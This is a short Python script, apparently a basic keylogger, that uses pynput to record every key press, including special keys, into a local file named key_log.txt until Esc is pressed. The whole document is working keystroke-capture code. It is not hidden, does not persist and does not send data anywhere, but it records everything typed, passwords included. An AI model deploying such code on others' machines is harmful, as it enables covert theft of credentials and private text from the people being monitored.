from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def on_press(key):
    try:
        # Attempt to write the character representation of the key
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # If it fails, it is a special key (not a character)
        with open(log_file, "a") as f:
            # Write the string representation of the key
            f.write(f'[{key}]')

def on_release(key):
    if key == Key.esc:
        return False
    
def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
